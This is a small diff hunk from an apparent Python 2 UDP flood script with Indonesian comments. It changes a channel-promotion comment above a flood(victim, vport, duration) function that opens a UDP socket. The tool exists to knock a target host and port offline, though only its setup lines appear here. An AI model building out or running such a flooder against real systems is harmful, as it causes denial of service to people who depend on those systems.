@@ -12,7 +12,7 @@ def usage():
     print "\33[1;33mLink YT : https://www.youtube.com/@hrcreator22"
     print "\33[0;36m=================================================="
 def flood(victim, vport, duration):
-    # Subscribe Roni YT
+    # Subscribe CyberXXII
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
